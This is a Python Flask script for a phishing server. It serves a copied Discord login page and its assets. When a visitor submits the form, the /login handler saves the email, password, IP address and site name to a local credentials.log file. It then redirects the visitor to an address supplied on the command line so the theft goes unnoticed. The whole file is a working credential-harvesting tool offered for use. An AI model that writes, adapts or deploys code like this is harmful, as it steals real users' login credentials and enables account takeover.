from flask import Flask,render_template,send_file,request,redirect
from sys import argv

def log(email, password, ip , sitename):
    with open("credentials.log" , "a") as file:
        if not ip==None:
            file.write(f"{email} : {password} : {ip} : {sitename}\n")
        else:
            file.write(f"{email} : {password} : {sitename}\n")
            

app =Flask(__name__)
redirect_url = argv[1]
host = argv[2]
port = int(argv[3])
sitename = argv[4]
@app.route("/")
def e():
    return render_template("Discord.html")
@app.route('/Discord_files/0.70a90daa9b002d99a7e7.css')
def sa():
    return send_file("templates/Discord_files/0.70a90daa9b002d99a7e7.css")
@app.route("/Discord_files/36d4b341723daffd4a372e1b19591da1.png ")
def asa():
    return send_file("templates/Discord_files/36d4b341723daffd4a372e1b19591da1.png ")

@app.route("/Discord_files/14c037b7102f18b2d2ccf065a52bb595.jpg")
def asds():
    return send_file("templates/Discord_files/14c037b7102f18b2d2ccf065a52bb595.jpg")
@app.route("/login", methods=["POST"])
def asjsjd():
    log(request.form.get("email")  , request.form.get("password") , request.headers.get("X-Forwarded-For") , sitename)
    # return redirect(redirect_url)
    return redirect(redirect_url)
# app.run(host=host, port=port)
app.run(host=host, port=port,)